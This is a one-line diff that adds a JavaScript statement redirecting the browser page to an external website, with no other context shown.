@@ -1,0 +1,1 @@
+window.location.href = "http://boole.shazz.me";
